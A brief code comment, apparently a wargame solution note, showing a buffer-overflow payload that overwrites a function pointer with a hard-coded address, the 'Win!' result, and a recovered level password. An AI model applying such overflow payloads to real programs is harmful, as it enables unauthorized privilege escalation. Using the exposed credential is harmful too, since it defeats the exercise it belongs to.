/*
 * The good function  address is 0x08048474
 * 利用缓冲区溢出覆盖函数指针变量的值，从而提权
 *
 * $ ./level03 $(perl -e 'print "A"x(76)."BBBB"')
 * ip at 0x42424242
 * Segment fault
 * $./level03 $(perl -e 'print "A"x(76)."\x74\x84\x04\x08"')
 * Win!
 * $ more .pass
 * 766SHzwZAUbf4g
 * */
